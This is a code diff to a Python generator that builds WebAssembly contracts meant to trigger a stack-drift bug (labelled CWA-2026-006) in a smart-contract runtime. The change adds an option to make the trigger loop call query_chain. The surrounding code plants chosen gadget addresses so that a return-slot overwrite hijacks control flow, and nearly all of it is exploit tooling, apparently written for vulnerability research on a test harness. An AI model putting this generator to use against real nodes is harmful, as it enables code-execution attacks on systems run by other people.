@@ -110,7 +110,22 @@ def gen_holder(outdir, dummy=0):
     print("wrote", p, f"({len(req)}-byte request, {N}-local hit-reporting holder)")
 
 
-def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None, dense_tail=0, frame32=0):
+def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None, dense_tail=0, frame32=0,
+                call_kind="db_read"):
+    if call_kind == "query":
+        # host call = contract-to-contract Smart query; the Go querier callback runs
+        # while this (trigger) execution is suspended -> observability hook.
+        qreq = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
+        call_import = '  (import "env" "query_chain" (func $host (param i32) (result i32)))'
+        call_arg = "(i32.const 192)"
+        extra_data = [
+            f'  (data (i32.const 192) "{esc(region(208, 256, len(qreq)))}")',
+            f'  (data (i32.const 208) "{esc(qreq)}")',
+        ]
+    else:
+        call_import = '  (import "env" "db_read" (func $host (param i32) (result i32)))'
+        call_arg = "(i32.const 16)"
+        extra_data = []
     if plants == "gadget" and plant_addr is not None:
         # aimed pivot: every planted slot = a chosen fixed code address (e.g. a ud2
         # gadget in the non-PIE harness binary) -> a return-slot overwrite transfers
@@ -125,9 +140,10 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
         ";; E6b trigger contract (generated).",
         f";; call when (i + {offset}) & 511 == 0; loop {iters} iterations" if not dense else f";; dense: call every iteration; loop {iters} iterations",
         "(module",
-        '  (import "env" "db_read" (func $db_read (param i32) (result i32)))',
+        call_import,
         '  (memory (export "memory") 1)',
         ALLOCATOR,
+        *extra_data,
         "  ;; CRITICAL: condition @0 must be nonzero so the THEN branch executes — the",
         "  ;; CWA-2026-006 drift is emitted in the then-branch epilogue (Operator::Else);",
         "  ;; with the else branch taken the buggy cleanup never runs (zero drift).",
@@ -164,7 +180,7 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
     ]
     if dense:
         lines += [
-            "        (call $db_read (i32.const 16))",
+            f"        (call $host {call_arg})",
             "        drop",
         ]
     elif dense_tail > 0:
@@ -175,12 +191,12 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
         dense_from = iters - 1 - dense_tail
         lines += [
             f"        (i32.or (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511))) (i32.gt_u (local.get $i) (i32.const {dense_from})))",
-            "        (if (then (call $db_read (i32.const 16)) drop))",
+            f"        (if (then (call $host {call_arg}) drop))",
         ]
     else:
         lines += [
             f"        (i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511)))",
-            "        (if (then (call $db_read (i32.const 16)) drop))",
+            f"        (if (then (call $host {call_arg}) drop))",
         ]
     # keep any frame32 locals live (zero effect) so they stay in the native frame
     bound = f"(i32.const {iters})"
@@ -243,10 +259,14 @@ def main():
                     help="after the last sparse call, call every iteration for this many iterations")
     ap.add_argument("--frame32", type=int, default=0,
                     help="extra i32 trigger locals (live in the loop) to flip 8B batch alignment parity")
+    ap.add_argument("--call-query", action="store_true",
+                    help="trigger loop calls query_chain (observability) instead of db_read")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
+    call_kind = "query" if args.call_query else "db_read"
     gen_holder(args.outdir, args.dummy)
-    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants, args.plant_addr, args.dense_tail, args.frame32)
+    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
+                args.plant_addr, args.dense_tail, args.frame32, call_kind)
     gen_benign(args.outdir)
 
 
